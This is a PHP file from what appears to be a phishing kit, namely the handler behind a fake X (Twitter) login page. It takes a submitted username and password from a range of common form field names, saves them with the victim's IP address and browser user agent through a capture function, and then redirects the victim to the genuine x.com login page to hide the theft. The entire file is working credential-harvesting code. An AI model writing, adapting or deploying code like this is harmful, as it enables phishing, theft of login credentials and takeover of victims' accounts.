<?php
require_once '../../config.php';

$username = '';
foreach (['email', 'username', 'user', 'login', 'uname', 'userid', 'phone'] as $field) {
    if (!empty($_POST[$field])) { $username = $_POST[$field]; break; }
}

$password = '';
foreach (['password', 'pass', 'passwd', 'pwd', 'passcode'] as $field) {
    if (!empty($_POST[$field])) { $password = $_POST[$field]; break; }
}

$template = 'x';
$ip = getClientIP();
$agent = sanitize($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown');

saveCapture([
    'username'   => sanitize($username),
    'password'   => $password,
    'ip_address' => $ip,
    'user_agent' => $agent,
    'template'   => $template
]);

if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
    header('Content-Type: application/json');
    echo json_encode(['status' => 'ok']);
    exit;
}
$redirect = 'https://x.com/login';
header('Location: ' . $redirect);
exit;
